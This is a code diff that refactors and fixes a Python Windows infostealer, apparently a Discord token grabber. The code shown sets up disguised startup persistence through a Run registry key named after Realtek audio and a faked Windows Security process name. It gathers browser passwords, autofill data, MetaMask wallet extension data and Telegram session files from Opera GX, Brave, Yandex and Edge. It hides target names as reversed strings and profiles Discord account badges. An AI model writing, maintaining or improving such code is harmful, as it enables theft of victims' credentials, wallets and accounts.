@@ -310,12 +310,12 @@ def create_copy_and_return_new_path():
 
 def add_to_startup(new_path):
     faked = 'SecurityHealthSystray.exe'
-    address = f"{sys.executable} {new_path}"
+    addrs = f"{sys.executable} {new_path}"
     key1 = winreg.HKEY_CURRENT_USER
     key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
     
     open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
-    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")
+    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {addrs}")
 
 
 
@@ -491,7 +491,7 @@ pictures_path = os.path.join(home_dir, 'Pictures')
 Threadlist = []
 
 badgeList =  [
-        {"Name": 'Active_Developer',                'Value': 4194304,   'Emoji': '<:active:1045283132796063794> '},
+        {"Name": 'Active_Developer','Value': 4194304,'Emoji': '<:active:1045283132796063794> '},
         {"Name": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': "<:developer:874750808472825986> "},
         {"Name": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': "<:bughunter_2:874750808430874664> "},
         {"Name": 'Early_Supporter', 'Value': 512, 'Emoji': "<:early_supporter:874750808414113823> "},
@@ -1050,7 +1050,7 @@ def histup():
         
     except:
         pass
-Tokqs = ''
+Tokqs = []
 def getTokq(path, arg):
     if not os.path.exists(path): return
 
@@ -1614,6 +1614,8 @@ def GatherZips(paths1, paths2, paths3):
 
 def GatherAll():
     global PasswCount
+    global injection
+    global DiscordStop
     c = 'emorhc'
     browserPaths = [        
         [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
@@ -1624,7 +1626,9 @@ def GatherAll():
         [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
+        
     ]
+
     d = 'drocsiD'
     ddd = 'btpdrocsid'
     dd = 'drocthgiL'
@@ -1646,9 +1650,10 @@ def GatherAll():
     Telegram = [f"{roaming}/Telegram Desktop/tdata", 'telegram.exe', "Telegram"]
     aa = []
     
-    eeee = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram]).start()
-    global injection
-    global DiscordStop
+    eeee = threading.Thread(target=GatherZips, args=[browserPaths, PathsToZip, Telegram])
+    eeee.start()
+    aa.append(eeee)
+
     if Startup == True:
         sta = threading.Thread(target=startup)
         sta.start()
@@ -1681,6 +1686,7 @@ def GatherAll():
         sta = threading.Thread(target=getAutofill,args=[patt[0], patt[3]])
         sta.start()
         aa.append(sta)
+        
     for thread in aa:
         thread.join()
         
@@ -1729,12 +1735,13 @@ def GatherAll():
             pass
     except:
         pass
-    
+    for thread in coc:
+        thread.join()
+        
     paaz_thread = threading.Thread(target=paaz)
     paaz_thread.start()
     aa.append(paaz_thread)
-    for thread in coc:
-        thread.join()
+
         
     if Fakegen == True:
         us = threading.Thread(target=fakegen)
